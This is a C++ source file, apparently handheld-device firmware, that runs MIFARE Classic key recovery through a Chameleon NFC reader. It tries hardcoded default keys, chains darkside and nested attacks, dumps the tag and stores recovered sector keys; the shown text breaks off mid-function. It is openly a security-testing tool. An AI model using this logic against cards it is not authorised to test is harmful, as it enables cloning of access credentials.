#include "ChameleonMfcDarksideScreen.h"
#include "ChameleonMfcScreen.h"
#include "ChameleonMfcUidWriteScreen.h"
#include "ChameleonMfcWriteScreen.h"
#include "core/AchievementManager.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "ui/actions/InputSelectAction.h"
#include "ui/actions/InputTextAction.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/components/Header.h"
#include "ui/components/StatusBar.h"
#include "ui/components/TagPrompt.h"
#include "ui/views/ProgressView.h"
#include "utils/ble/ChameleonClient.h"
#include "utils/nfc/MfcKeyStore.h"
#include "utils/nfc/NdefParser.h"

#include "utils/IdentityFile.h"
extern "C" {
#include "utils/crypto/crapto1.h"
}

// Single helper: oddparity of a byte. Used by _isNonce below.
static uint8_t _par8(uint8_t b) {
  b ^= b >> 4; b ^= b >> 2; b ^= b >> 1; return (~b) & 1;
}

// parity check used by nested attack distance enumeration
static uint8_t _isNonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, const uint8_t* par) {
  return (
    (uint8_t)(_par8((Nt >> 24) & 0xFF) == (par[0] ^ _par8((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
    (uint8_t)(_par8((Nt >> 16) & 0xFF) == (par[1] ^ _par8((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,  8))) &
    (uint8_t)(_par8((Nt >>  8) & 0xFF) == (par[2] ^ _par8((NtEnc >>  8) & 0xFF) ^ BIT(Ks1,  0)))
  );
}


// ── Helpers ──

static void _recoverProgress(const char* msg, int pct) {
  ProgressView::progress(msg, pct);
}

uint8_t ChameleonMfcScreen::_trailerBlock(uint8_t sector) {
  return (sector < 32) ? (sector * 4 + 3) : (128 + (sector - 32) * 16 + 15);
}

uint16_t ChameleonMfcScreen::_totalBlocks() {
  if (_sectors == 5)  return 20;
  if (_sectors == 40) return 256;
  return 64;
}

const char* ChameleonMfcScreen::title() {
  if (_state == STATE_RECOVER && _chainStage[0]) return _chainStage;
  switch (_state) {
    case STATE_AUTH:               return "Read Tag";
    case STATE_MF_MENU:            return "MIFARE Classic";
    case STATE_SHOW_KEYS:          return "Check Known Keys";
    case STATE_DUMP:               return "Read Tag";
    case STATE_DUMP_RESULT:        return "Tag Details";
    case STATE_DUMP_HEX:           return "Memory Dump";
    case STATE_DICT_SEL:
    case STATE_DICT_RUN:
    case STATE_DICT_LOG:           return "Dictionary Attack";
    case STATE_STATIC_NESTED:
    case STATE_STATIC_NESTED_LOG:  return "Static Nested";
    case STATE_NESTED:
    case STATE_NESTED_LOG:         return "Nested Attack";
    case STATE_RECOVER:            return "Recover Keys";
    case STATE_READ_PREVIEW:       return "Tag Details";
  }
  return "MIFARE Classic";
}

void ChameleonMfcScreen::onInit() {
  if (_startAction == ACTION_DICTIONARY) _loadDictPicker();
  else _callAuth();
}

// ── Status bar callbacks ──

void ChameleonMfcScreen::_authStatusBarCb(Sprite& sp, int barY, int width, void* userData) {
  auto* self = static_cast<ChameleonMfcScreen*>(userData);
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_CYAN);
  sp.drawString(self->_authStatus, 2, barY);
  char pctBuf[8];
  snprintf(pctBuf, sizeof(pctBuf), "%d%%", self->_authPct);
  sp.setTextDatum(TR_DATUM);
  sp.setTextColor(TFT_WHITE);
  sp.drawString(pctBuf, width - 2, barY);
}

void ChameleonMfcScreen::_actionStatusBarCb(Sprite& sp, int barY, int width, void* userData) {
  auto* self = static_cast<ChameleonMfcScreen*>(userData);
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_WHITE);
  sp.drawString(self->_actionStatus, 2, barY);
  char pctBuf[8];
  snprintf(pctBuf, sizeof(pctBuf), "%d%%", self->_actionPct);
  sp.setTextDatum(TR_DATUM);
  sp.setTextColor(TFT_WHITE);
  sp.drawString(pctBuf, width - 2, barY);
  const int pctW = sp.textWidth(pctBuf);
  sp.setTextColor(TFT_CYAN);
  sp.drawString(self->_actionAttempt, width - pctW - 8, barY);
}

// ── Auth ──

void ChameleonMfcScreen::_callAuth() {
  _state   = STATE_AUTH;
  _running = true;
  memset(_keysA, 0, sizeof(_keysA));
  memset(_keysB, 0, sizeof(_keysB));
  memset(_foundA, 0, sizeof(_foundA));
  memset(_foundB, 0, sizeof(_foundB));
  _recovered = 0;

  _authLog.clear();
  _authPct = 0;
  _waitingForTag = true;
  strncpy(_authStatus, "Waiting for tag...", sizeof(_authStatus) - 1);

  // STATE_AUTH renders the LogView, including its progress/status strip.
  // Drawing that intermediate state before the initial tag prompt can leave
  // a small remnant outside the body rectangle. Restore only the owning
  // screen chrome here; the LogView takes over once authentication starts.
  Header header;
  header.render(title());
  StatusBar::refresh();

  auto& c = ChameleonClient::get();
  c.setMode(1);

  TagPrompt::show("Waiting for tag...", bodyX(), bodyY(), bodyW(), bodyH(), title());

  uint8_t atqa[2] = {}, sak = 0;
  bool found = false;
  const uint32_t waitStart = millis();
  while (millis() - waitStart < ChameleonClient::kTagWaitMs) {
    Uni.update();
    if (Uni.Nav->wasPressed() && Uni.Nav->readDirection() == INavigation::DIR_BACK) {
      c.setMode(0);
      _running = false;
      _authStatus[0] = '\0';
      _authPct = 0;
      if (_startAction == ACTION_DICTIONARY && _dictAttackPending) { _dictAttackPending = false; _loadDictPicker(); }
      else Screen.goBack();
      return;
    }
    if (c.scan14A(_uid, &_uidLen, atqa, &sak)) { found = true; break; }
    delay(50);
  }
  if (!found) {
    c.setMode(0);
    _running = false;
    _authStatus[0] = '\0';
    _authPct = 0;
    render();
    StatusBar::refresh();
    ShowStatusAction::show("Tag not detected", 1200);
    if (_startAction == ACTION_DICTIONARY && _dictAttackPending) { _dictAttackPending = false; _loadDictPicker(); }
    else Screen.goBack();
    return;
  }

  _waitingForTag = false;

  _sak = sak;
  memcpy(_atqa, atqa, sizeof(_atqa));
  if (sak == 0x18)      _sectors = 40;
  else if (sak == 0x09) _sectors = 5;
  else                  _sectors = 16;

  if (!c.mf1Support()) {
    c.setMode(0);
    _running = false;
    render();
    ShowStatusAction::show("Tag not supported", 1200);
    if (_startAction == ACTION_DICTIONARY && _dictAttackPending) { _dictAttackPending = false; _loadDictPicker(); }
    else Screen.goBack();
    return;
  }

  char msg[64];

  // Known Keys is a viewer: after resolving the UID, load persisted
  // results and display them without authenticating or running an attack.
  if (_startAction == ACTION_SHOW_KEYS) {
    _loadKeys();
    c.setMode(0);
    _running = false;
    _showDiscoveredKeys();
    return;
  }

  // Reuse keys previously discovered for this UID. They are verified below
  // before being trusted, then FFFFFFFFFFFF fills any remaining gaps.
  _loadKeys();

  // Standalone Dictionary Attack: verify only persisted keys. Keep this quick
  // check in the same LogView used by the dictionary instead of opening a
  // separate ProgressView or silently trying default keys.
  if (_startAction == ACTION_DICTIONARY && _dictAttackPending) {
    _actionLog.clear();
    _actionPct = 0;
    if (_dictSource == MfcKeyStore::kBuiltinDefaultId) strncpy(_actionStatus, "Default", sizeof(_actionStatus) - 1);
    else if (_dictSource == MfcKeyStore::kDiscoveredDictionary) strncpy(_actionStatus, "Discovered", sizeof(_actionStatus) - 1);
    else if (_dictSource == MfcKeyStore::kBuiltinExtendedId) strncpy(_actionStatus, "Extended", sizeof(_actionStatus) - 1);
    else { String label=_dictSource; int slash=label.lastIndexOf('/'); if(slash>=0) label=label.substring(slash+1); if(label.endsWith(".txt")) label.remove(label.length()-4); strncpy(_actionStatus,label.c_str(),sizeof(_actionStatus)-1); }
    _actionStatus[sizeof(_actionStatus) - 1] = 0;
    _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
    int totalWork = 0;
    for (uint8_t sec = 0; sec < _sectors; ++sec) {
      if (_foundA[sec]) ++totalWork;
      if (_foundB[sec]) ++totalWork;
    }
    int progress = 0;
    for (uint8_t sec = 0; sec < _sectors; ++sec) {
      const uint8_t block = _trailerBlock(sec);
      for (int kt = 0; kt < 2; ++kt) {
        bool& foundSlot = (kt == 0) ? _foundA[sec] : _foundB[sec];
        if (!foundSlot) continue;
        ++progress;
        uint8_t* key = (kt == 0) ? _keysA[sec] : _keysB[sec];
        Uni.update();
        if (Uni.Nav && Uni.Nav->wasPressed() && Uni.Nav->readDirection() == INavigation::DIR_BACK) {
          c.setMode(0); _running = false; _dictAttackPending = false;
          ShowStatusAction::show("Cancelled", 1000); _loadDictPicker(); return;
        }
        if (!c.mf1CheckKey(block, kt == 0 ? 0x60 : 0x61, key)) { foundSlot = false; if (_recovered) --_recovered; }
      }
    }
    c.setMode(0); _running = false; _dispatchStartAction(); return;
  }

  // Read Tag is intentionally quick: verify persisted keys, then try five
  // common Classic keys. Full Default is reserved for Recover Keys.
  const uint8_t (*defaultKeys)[6] = nullptr;
  size_t defaultKeyCount = 0;
  MfcKeyStore::builtinDictionary(MfcKeyStore::kBuiltinDefaultId, &defaultKeys, &defaultKeyCount);
  int totalWork = _sectors * 2;
  int progress  = 0;
  ProgressView::init();
  snprintf(_authStatus, sizeof(_authStatus), "Authenticating sectors (1/%u)...", (unsigned)_sectors);
  ProgressView::progress(_authStatus, 0);

  for (uint8_t s = 0; s < _sectors; s++) {
    uint8_t block = _trailerBlock(s);
    for (int kt = 0; kt < 2; kt++) {
      uint8_t keyType   = (kt == 0) ? 0x60 : 0x61;
      char    keyTypeCh = (kt == 0) ? 'A'  : 'B';
      _authPct = (int)((uint32_t)s * 100U / _sectors);

      bool hadSaved = (kt == 0) ? _foundA[s] : _foundB[s];
      snprintf(_authStatus, sizeof(_authStatus), "Authenticating sectors (%u/%u)...",
               (unsigned)(s + 1u), (unsigned)_sectors, keyTypeCh);
      ProgressView::progress(_authStatus, _authPct);

      bool ok = false;
      if (hadSaved) {
        uint8_t* saved = (kt == 0) ? _keysA[s] : _keysB[s];
        ok = c.mf1CheckKey(block, keyType, saved);
        if (!ok) {
          if (kt == 0) _foundA[s] = false; else _foundB[s] = false;
          _recovered--;
        }
      }

      if (!ok) {
        for (size_t dk = 0; dk < defaultKeyCount && !ok; ++dk) {
          static const uint8_t quickKeys[5][6] = {
            {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, {0x00,0x00,0x00,0x00,0x00,0x00},
            {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},
            {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5}
          };
          bool quick = false;
          for (const auto& qk : quickKeys) if (memcmp(defaultKeys[dk], qk, 6) == 0) { quick = true; break; }
          if (!quick) continue;
          ok = c.mf1CheckKey(block, keyType, defaultKeys[dk]);
          if (ok) {
            if (kt == 0) {
              memcpy(_keysA[s], defaultKeys[dk], 6);
              if (!_foundA[s]) { _foundA[s] = true; _recovered++; }
            } else {
              memcpy(_keysB[s], defaultKeys[dk], 6);
              if (!_foundB[s]) { _foundB[s] = true; _recovered++; }
            }
          }
        }
      }

      progress++;
    }
  }

  snprintf(msg, sizeof(msg), "Authenticating sectors (%d/%d)...", totalWork, totalWork);
  ProgressView::progress(msg, 100);
  ProgressView::finish();

  if (_recovered > 0) {
    _saveKeys();
    int n = Achievement.inc("chameleon_dict_attack");
    if (n == 1) Achievement.unlock("chameleon_dict_attack");
    Achievement.setMax("chameleon_mfc_keys_found", _recovered);
    if (_recovered >= 10) Achievement.unlock("chameleon_mfc_keys_found");
  }

  c.setMode(0);
  _running = false;
  _dispatchStartAction();
}

void ChameleonMfcScreen::_dispatchStartAction() {
  switch (_startAction) {
    case ACTION_READ_TAG:      _continueRead(); break;
    case ACTION_SHOW_KEYS:     _showDiscoveredKeys(); break;
    case ACTION_DICTIONARY:
      if (_dictAttackPending) { _dictAttackPending = false; _runDictAttack(); }
      else _loadDictPicker();
      break;
    case ACTION_STATIC_NESTED: _callStaticNested(); break;
    case ACTION_NESTED:        _callNestedAttack(); break;
    case ACTION_DARKSIDE:
      _enterMfMenu();
      Screen.push(new ChameleonMfcDarksideScreen(_uid, _uidLen, _sectors, _foundA, _foundB));
      break;
    case ACTION_RECOVER:
      _callRecoverKeys();
      break;
  }
}

void ChameleonMfcScreen::_continueRead() {
  // A sector is readable when at least one of its keys is known. Requiring
  // both A and B here would offer a partial-read fallback even when every
  // sector can already be read with the credentials we have.
  bool readableEverySector = true;
  for (int s = 0; s < _sectors; ++s) {
    if (!_foundA[s] && !_foundB[s]) {
      readableEverySector = false;
      break;
    }
  }
  if (readableEverySector) {
    _callDump();
    return;
  }

  _showReadPreview();
}

void ChameleonMfcScreen::_enterMfMenu() {
  _state = STATE_MF_MENU;
  setItems(_mfItems, 6);
}

void ChameleonMfcScreen::_showReadPreview() {
  _state = STATE_READ_PREVIEW;
  _rowCount = 0;

  auto addRow = [&](const String& label, const String& value) {
    if (_rowCount >= MAX_ROWS) return;
    _rowLabels[_rowCount] = label;
    _rowValues[_rowCount] = value;
    _rows[_rowCount] = { _rowLabels[_rowCount].c_str(),
                         _rowValues[_rowCount].c_str() };
    ++_rowCount;
  };

  char uid[24] = {};
  for (uint8_t i = 0; i < _uidLen; ++i) {
    char b[4];
    snprintf(b, sizeof(b), "%02X%s", _uid[i], (i + 1 < _uidLen) ? ":" : "");
    strcat(uid, b);
  }
  char atqa[8];
  snprintf(atqa, sizeof(atqa), "%02X%02X", _atqa[0], _atqa[1]);
  char sak[6];
  snprintf(sak, sizeof(sak), "%02X", _sak);

  const char* type = (_sectors == 5) ? "MF Classic Mini"
                   : (_sectors == 40) ? "MF Classic 4K"
                                      : "MF Classic 1K";
  uint8_t sectorsWithKey = 0;
  for (uint8_t s = 0; s < _sectors; ++s) {
    if (_foundA[s] || _foundB[s]) ++sectorsWithKey;
  }

  addRow("Type", type);
  addRow("UID", uid);
  addRow("ATQA", atqa);
  addRow("SAK", sak);
  addRow("Sectors", String((unsigned)_sectors));
  addRow("Keys", String((unsigned)sectorsWithKey) + "/" + String((unsigned)_sectors) + " sectors");
  addRow("Status", "Partial");
  addRow("[Press]", "Actions");
  _scrollView.setRows(_rows, _rowCount);
  render();
}

void ChameleonMfcScreen::_showReadActions() {
  static const InputSelectAction::Option opts[] = {
    {"Recover Keys", "recover"},
    {"Partial Read", "partial"},
  };
  const char* r = InputSelectAction::popup("Missing sector keys", opts, 2, nullptr);
  render();
  if (!r) return;
  if (strcmp(r, "partial") == 0) {
    _callDump();
    return;
  }
  _resumeReadAfterAttack = true;
  _callRecoverKeys();
}

bool ChameleonMfcScreen::_hasAnyKey() const {
  for (uint8_t s = 0; s < _sectors; ++s)
    if (_foundA[s] || _foundB[s]) return true;
  return false;
}

bool ChameleonMfcScreen::_hasMissingKeys() const {
  for (uint8_t s = 0; s < _sectors; ++s)
    if (!_foundA[s] || !_foundB[s]) return true;
  return false;
}

bool ChameleonMfcScreen::_hasKeyForEverySector() const {
  for (uint8_t s = 0; s < _sectors; ++s)
    if (!_foundA[s] && !_foundB[s]) return false;
  return true;
}

bool ChameleonMfcScreen::_hasAllKeys() const {
  for (uint8_t s = 0; s < _sectors; ++s)
    if (!_foundA[s] || !_foundB[s]) return false;
  return true;
}

uint8_t ChameleonMfcScreen::_authenticatedSectors() const {
  uint8_t covered = 0;
  for (uint8_t s = 0; s < _sectors; ++s)
    if (_foundA[s] || _foundB[s]) ++covered;
  return covered;
}

bool ChameleonMfcScreen::_recoverObjectiveMet() const {
  // Read Tag only needs one usable key per sector. Standalone Attack Chain
  // keeps going until both A and B are recovered, or no method remains.
  return _resumeReadAfterAttack ? _hasKeyForEverySector() : _hasAllKeys();
}

void ChameleonMfcScreen::_setChainStage(const char* name) {
  strncpy(_chainStage, name ? name : "", sizeof(_chainStage) - 1);
  _chainStage[sizeof(_chainStage) - 1] = 0;
  Header header;
  header.render(title());
  StatusBar::refresh();
}

void ChameleonMfcScreen::_finishRecover(bool success, const char* status,
                                        bool restoreMode, uint8_t previousMode,
                                        bool havePreviousMode,
                                        bool allowPartialReadOnFailure) {
  ProgressView::finish();
  auto& c = ChameleonClient::get();
  if (restoreMode && havePreviousMode) c.setMode(previousMode);
  else c.setMode(0);
  _running = false;
  _chainStage[0] = 0;
  const bool resumeRead = _resumeReadAfterAttack;
  _resumeReadAfterAttack = false;
  _trackRecoveryKeys = false;
  char recoveredMsg[80];
  if (success) {
    _keySummary.format(recoveredMsg, sizeof(recoveredMsg), _authenticatedSectors(), _sectors);
    status = recoveredMsg;
  }
  if (status && status[0]) ShowStatusAction::show(status, success ? 1400 : 1800);
  if (resumeRead && (success || (allowPartialReadOnFailure && _hasAnyKey()))) {
    // A failed advanced recovery step does not invalidate keys already found.
    // Attempt a partial read only when explicitly permitted; cancellation
    // never permits automatic reading. _callDump() handles missing blocks.
    _callDump();
    return;
  }
  _showReadPreview();
}

void ChameleonMfcScreen::_callRecoverKeys() {
  _state = STATE_RECOVER;
  _running = true;
  _recoverStartCount = _recovered;
  _keySummary.reset();
  _trackRecoveryKeys = true;
  _setChainStage("Dictionary Attack");

  auto& c = ChameleonClient::get();
  uint8_t previousMode = 0;
  const bool restore = c.getMode(&previousMode);
  if (!c.setMode(1)) {
    _running = false;
    _trackRecoveryKeys = false;
    _chainStage[0] = 0;
    if (restore) c.setMode(previousMode);
    ShowStatusAction::show("Unable to enter reader mode", 1600);
    _showReadPreview();
    return;
  }

  _actionLog.clear();
  strncpy(_actionStatus, "Starting...", sizeof(_actionStatus) - 1);
  _actionStatus[sizeof(_actionStatus) - 1] = 0;
  _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
                  _actionStatusBarCb, this);
  const DictControl dictResult = _runChainDictionaries();
  if (_dictNewFound > 0) _saveKeys();
  if (dictResult == DictControl::Cancel) {
    _finishRecover(false, "Cancelled", true, previousMode, restore);
    return;
  }
  if (dictResult == DictControl::Error) {
    _finishRecover(false, _dictError[0] ? _dictError : "Dictionary error",
                   true, previousMode, restore, true);
    return;
  }
  if (_recoverObjectiveMet()) {
    _finishRecover(true, nullptr,
                   true, previousMode, restore);
    return;
  }

  uint8_t ntLevel = 0;
  _recoverProgress("Checking PRNG...", 90);
  const bool ntOk = c.mf1NTLevel(&ntLevel);
  if (!ntOk) {
    // mf1NTLevel() returning false means the command/response failed; it
    // does not mean that the tag's PRNG itself failed the classification.
    _finishRecover(false, "PRNG command failed", true, previousMode, restore, true);
    return;
  }

  if (!_hasAnyKey() && ntLevel == 2) {
    _setChainStage("Darkside");
    _recoverProgress("Darkside", 50);
    ChameleonMfcDarksideScreen darkside(_uid, _uidLen, _sectors, _foundA, _foundB);
    darkside.runUntilFirstKey();
    auto rec = ChameleonMfcDarksideScreen::takeRecoveredKey();
    if (rec.valid && rec.uidLen == _uidLen &&
        memcmp(rec.uid, _uid, _uidLen) == 0 && rec.sector < 40) {
      if (rec.keyB) {
        memcpy(_keysB[rec.sector], rec.key, 6);
        if (!_foundB[rec.sector]) { _foundB[rec.sector] = true; _recovered++; _keySummary.add(rec.key); }
      } else {
        memcpy(_keysA[rec.sector], rec.key, 6);
        if (!_foundA[rec.sector]) { _foundA[rec.sector] = true; _recovered++; _keySummary.add(rec.key); }
      }
      _saveKeys();
    }
    if (_recoverObjectiveMet()) {
      _finishRecover(true, nullptr,
                     true, previousMode, restore);
      return;
    }
  }

  if (_recoverObjectiveMet()) {
    _finishRecover(true, nullptr,
                   true, previousMode, restore);
    return;
  }

  if (_hasAnyKey() && _hasMissingKeys() && ntLevel == 1) {
    _recoverProgress("Static Nested", 100);
    delay(200);
    ProgressView::finish();
    if (restore) c.setMode(previousMode);
    _chainStage[0] = 0;
    const AdvancedAttackResult result = _callStaticNested();
    if (result == AdvancedAttackResult::Cancelled) return;
    if (result == AdvancedAttackResult::Failed) {
      _finishRecover(false, "Static Nested failed", true, previousMode, restore, true);
      return;
    }
    _finishRecover(true, nullptr, true, previousMode, restore);
    return;
  }
  if (_hasAnyKey() && _hasMissingKeys() && ntLevel == 2) {
    _recoverProgress("Nested Attack", 100);
    delay(200);
    ProgressView::finish();
    if (restore) c.setMode(previousMode);
    _chainStage[0] = 0;
    const AdvancedAttackResult result = _callNestedAttack();
    if (result == AdvancedAttackResult::Cancelled) return;
    if (result == AdvancedAttackResult::Failed) {
      _finishRecover(false, "Nested Attack failed", true, previousMode, restore, true);
      return;
    }
    _finishRecover(true, nullptr, true, previousMode, restore);
    return;
  }
  if (_hasAnyKey() && _hasMissingKeys() && ntLevel == 3) {
    _finishRecover(false, "Hard PRNG — unsupported", true, previousMode, restore, true);
    return;
  }

  if (_resumeReadAfterAttack) {
    _finishRecover(true, nullptr, true, previousMode, restore);
  } else {
    _finishRecover(false,
                   !_hasAnyKey()
                       ? (ntLevel == 1 ? "Need 1 key for Static Nested" : "No key found")
                       : "Recovery finished",
                   true, previousMode, restore);
  }
}

// ── Known Keys ──

void ChameleonMfcScreen::_buildKeyRows() {
  _rowCount = 0;

  char uidStr[20] = {};
  for (uint8_t i = 0; i < _uidLen && i * 2 + 2 < (int)sizeof(uidStr); i++) {
    char h[4]; snprintf(h, sizeof(h), "%02X", _uid[i]); strcat(uidStr, h);
  }
  _rowLabels[_rowCount] = "UID";
  _rowValues[_rowCount] = uidStr;
  _rows[_rowCount] = { _rowLabels[_rowCount].c_str(), _rowValues[_rowCount] };
  _rowCount++;

  char sakStr[8];
  snprintf(sakStr, sizeof(sakStr), "%02X", _sak);
  _rowLabels[_rowCount] = "SAK";
  _rowValues[_rowCount] = sakStr;
  _rows[_rowCount] = { _rowLabels[_rowCount].c_str(), _rowValues[_rowCount] };
  _rowCount++;

  char recStr[16];
  snprintf(recStr, sizeof(recStr), "%d / %d", _recovered, _sectors * 2);
  _rowLabels[_rowCount] = "Keys";
  _rowValues[_rowCount] = recStr;
  _rows[_rowCount] = { _rowLabels[_rowCount].c_str(), _rowValues[_rowCount] };
  _rowCount++;

  for (uint8_t s = 0; s < _sectors && _rowCount + 1 < MAX_ROWS; s++) {
    char lbl[12], val[16];

    snprintf(lbl, sizeof(lbl), "S%02d A", s);
    if (_foundA[s])
      snprintf(val, sizeof(val), "%02X%02X%02X%02X%02X%02X",
               _keysA[s][0], _keysA[s][1], _keysA[s][2],
               _keysA[s][3], _keysA[s][4], _keysA[s][5]);
    else
      snprintf(val, sizeof(val), "---");
    _rowLabels[_rowCount] = lbl;
    _rowValues[_rowCount] = val;
    _rows[_rowCount] = { _rowLabels[_rowCount].c_str(), _rowValues[_rowCount] };
    _rowCount++;

    if (_rowCount >= MAX_ROWS) break;

    snprintf(lbl, sizeof(lbl), "S%02d B", s);
    if (_foundB[s])
      snprintf(val, sizeof(val), "%02X%02X%02X%02X%02X%02X",
               _keysB[s][0], _keysB[s][1], _keysB[s][2],
               _keysB[s][3], _keysB[s][4], _keysB[s][5]);
    else
      snprintf(val, sizeof(val), "---");
    _rowLabels[_rowCount] = lbl;
    _rowValues[_rowCount] = val;
    _rows[_rowCount] = { _rowLabels[_rowCount].c_str(), _rowValues[_rowCount] };
    _rowCount++;
  }

  _scrollView.setRows(_rows, _rowCount);
}

void ChameleonMfcScreen::_showDiscoveredKeys() {
  _state = STATE_SHOW_KEYS;
  _buildKeyRows();
  render();
}

// ── Persisted keys (shared format with PN532) ──

static bool _parseSavedMfcKeyCu(const String& text, uint8_t out[6]) {
  String s = text;
  s.trim();
  if (s.length() != 12) return false;
  for (int i = 0; i < 6; ++i) {
    char hex[3] = { s[i * 2], s[i * 2 + 1], 0 };
    char* end = nullptr;
    unsigned long v = strtoul(hex, &end, 16);
    if (!end || *end != 0) return false;
    out[i] = (uint8_t)v;
  }
  return true;
}

void ChameleonMfcScreen::_loadKeys() {
  if (!Uni.Storage || !Uni.Storage->isAvailable() || _uidLen == 0) return;

  char uidHex[16] = {};
  for (uint8_t i = 0; i < _uidLen && i * 2 + 2 < (int)sizeof(uidHex); i++) {
    char h[4]; snprintf(h, sizeof(h), "%02X", _uid[i]); strcat(uidHex, h);
  }
  String path = String("/unigeek/nfc/keys/") + uidHex + ".txt";
  String content = Uni.Storage->readFile(path.c_str());
  if (content.length() == 0) return;

  int start = 0;
  while (start < (int)content.length()) {
    int nl = content.indexOf('\n', start);
    if (nl < 0) nl = content.length();
    String line = content.substring(start, nl);
    line.trim();

    int sector = -1;
    char keyType = 0;
    char hex[13] = {};
    if (sscanf(line.c_str(), "S%d %c %12s", &sector, &keyType, hex) == 3 &&
        sector >= 0 && sector < _sectors) {
      uint8_t raw[6];
      if (_parseSavedMfcKeyCu(String(hex), raw)) {
        if (keyType == 'A' || keyType == 'a') {
          memcpy(_keysA[sector], raw, 6);
          if (!_foundA[sector]) { _foundA[sector] = true; _recovered++; }
        } else if (keyType == 'B' || keyType == 'b') {
          memcpy(_keysB[sector], raw, 6);
          if (!_foundB[sector]) { _foundB[sector] = true; _recovered++; }
        }
      }
    }
    start = nl + 1;
  }
}

// ── Save keys (shared persisted-key format) ──

void ChameleonMfcScreen::_saveKeys() {
  MfcKeyStore::saveUidKeys(Uni.Storage, _uid, _uidLen, _sectors,
                           _foundA, _foundB, _keysA, _keysB);
}

// Helper: log a line then immediately redraw the action log so the user sees it live.
void ChameleonMfcScreen::_log(const char* line, uint16_t color) {
  _actionLog.addLine(line, color);
  _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
}


// ── Dump Memory ──

void ChameleonMfcScreen::_freeDump() {
  if (_dump) {
    free(_dump);
    _dump = nullptr;
  }
  _dumpLen = 0;
  _dumpBlocks = 0;
}

bool ChameleonMfcScreen::_extractDumpNdef(uint8_t** ndef, size_t* ndefLen) const {
  if (ndef) *ndef = nullptr;
  if (ndefLen) *ndefLen = 0;
  if (!_dump || !_dumpLen || !ndef || !ndefLen) return false;

  uint8_t ndefSectors[39] = {};
  size_t sectorCount = 0;

  auto addIfNdef = [&](uint8_t sector, uint8_t lo, uint8_t hi) {
    if (sector >= _sectors || sectorCount >= sizeof(ndefSectors)) return;
    if (lo == 0x03 && hi == 0xE1) ndefSectors[sectorCount++] = sector;
  };

  // MAD1: sector 0, blocks 1 and 2. AIDs are stored low byte first.
  if (_dumpLen >= 48) {
    const uint8_t* b1 = _dump + 16;
    const uint8_t* b2 = _dump + 32;
    for (uint8_t s = 1; s <= 7 && s < _sectors; ++s) {
      size_t off = 2 + (size_t)(s - 1) * 2;
      addIfNdef(s, b1[off], b1[off + 1]);
    }
    for (uint8_t s = 8; s <= 15 && s < _sectors; ++s) {
      size_t off = (size_t)(s - 8) * 2;
      addIfNdef(s, b2[off], b2[off + 1]);
    }
  }

  // MAD2: Classic 4K sector 16, blocks 64..66, maps sectors 17..39.
  if (_sectors > 16 && _dumpLen >= (67u * 16u)) {
    const uint8_t* m0 = _dump + 64u * 16u;
    const uint8_t* m1 = _dump + 65u * 16u;
    const uint8_t* m2 = _dump + 66u * 16u;
    for (uint8_t s = 17; s <= 23; ++s) {
      size_t off = 2 + (size_t)(s - 17) * 2;
      addIfNdef(s, m0[off], m0[off + 1]);
    }
    for (uint8_t s = 24; s <= 31; ++s) {
      size_t off = (size_t)(s - 24) * 2;
      addIfNdef(s, m1[off], m1[off + 1]);
    }
    for (uint8_t s = 32; s <= 39; ++s) {
      size_t off = (size_t)(s - 32) * 2;
      addIfNdef(s, m2[off], m2[off + 1]);
    }
  }

  if (sectorCount == 0) return false;

  size_t areaLen = 0;
  for (size_t i = 0; i < sectorCount; ++i)
    areaLen += (ndefSectors[i] < 32) ? 48u : 240u;

  uint8_t* area = (uint8_t*)malloc(areaLen);
  if (!area) return false;

  size_t out = 0;
  for (size_t i = 0; i < sectorCount; ++i) {
    const uint8_t sector = ndefSectors[i];
    const uint16_t firstBlock = (sector < 32)
                                  ? (uint16_t)sector * 4u
                                  : (uint16_t)(128u + (sector - 32u) * 16u);
    const uint8_t dataBlocks = (sector < 32) ? 3 : 15;
    for (uint8_t bi = 0; bi < dataBlocks; ++bi) {
      const size_t off = (size_t)(firstBlock + bi) * 16u;
      if (off + 16u > _dumpLen) {
        free(area);
        return false;
      }
      memcpy(area + out, _dump + off, 16);
      out += 16;
    }
  }

  size_t pos = 0;
  while (pos < out) {
    const uint8_t tlv = area[pos++];
    if (tlv == 0x00) continue;
    if (tlv == 0xFE) break;
    if (pos >= out) break;

    size_t len = area[pos++];
    if (len == 0xFF) {
      if (pos + 1 >= out) break;
      len = ((size_t)area[pos] << 8) | area[pos + 1];
      pos += 2;
    }
    if (pos + len > out) break;

    if (tlv == 0x03 && len > 0) {
      uint8_t* extracted = (uint8_t*)malloc(len);
      if (!extracted) {
        free(area);
        return false;
      }
      memcpy(extracted, area + pos, len);
      free(area);
      *ndef = extracted;
      *ndefLen = len;
      return true;
    }
    pos += len;
  }

  free(area);
  return false;
}

void ChameleonMfcScreen::_buildDumpPreview() {
  _rowCount = 0;

  auto addRow = [&](const String& label, const String& value) {
    if (_rowCount >= MAX_ROWS) return false;
    _rowLabels[_rowCount] = label;
    _rowValues[_rowCount] = value;
    _rows[_rowCount] = { _rowLabels[_rowCount].c_str(),
                         _rowValues[_rowCount].c_str() };
    ++_rowCount;
    return true;
  };

  auto addWrappedRow = [&](const String& label, const String& value) {
    if (value.length() == 0) {
      addRow(label, "");
      return;
    }

    String normalized = value;
    normalized.replace("\r\n", "\n");
    normalized.replace("\r", "\n");

    int pos = 0;
    bool first = true;
    while (pos <= (int)normalized.length()) {
      int nl = normalized.indexOf('\n', pos);
      if (nl < 0) nl = normalized.length();

      String line = normalized.substring(pos, nl);
      if (line.length() == 0) {
        addRow(first ? label : "", "");
        first = false;
      } else {
        // Keep individual rows short enough for ScrollListView while
        // preserving explicit line boundaries.
        static constexpr int kChunk = 28;
        int off = 0;
        while (off < (int)line.length()) {
          int end = min(off + kChunk, (int)line.length());
          addRow(first ? label : "", line.substring(off, end));
          first = false;
          off = end;
